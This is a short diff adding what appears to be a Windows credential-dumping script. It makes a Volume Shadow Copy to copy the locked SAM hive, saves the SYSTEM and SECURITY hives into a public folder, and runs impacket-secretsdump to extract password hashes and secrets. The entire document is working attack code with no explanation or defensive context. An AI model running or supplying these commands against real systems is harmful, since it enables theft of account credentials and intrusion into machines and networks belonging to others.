@@ -1,0 +1,7 @@
+$vss = (vssadmin create shadow /for=C: | Select-String "GLOBALROOT").ToString().Split()[-1]
+cmd.exe /c "copy $vss\Windows\System32\config\SAM C:\Users\Public\sam.save"
+
+reg save HKLM\SYSTEM C:\Users\Public\system.save
+reg save HKLM\SECURITY C:\Users\Public\security.save
+
+impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
